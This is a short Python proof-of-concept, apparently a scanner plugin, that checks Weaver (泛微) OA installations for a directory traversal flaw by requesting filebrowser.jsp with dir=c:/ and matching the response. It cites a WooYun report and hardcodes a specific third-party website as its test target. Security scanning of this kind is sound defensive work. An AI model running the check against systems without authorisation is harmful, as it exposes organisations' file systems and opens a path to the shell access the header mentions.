#!usr/bin/env python
# *-* coding:utf-8 *-*

"""
POC Name  :  泛微oa任意目录遍历(登录后可getshell)
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148980

"""

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

def audit(arg):
    url = arg + 'document/imp/filebrowser.jsp?dir=c:/'
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "selectIt(this);" in res and 'Windows' in res:
        security_hole('weaver oa arbitrarily Directory traversal')
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oa.ad-mart.cn/')[1])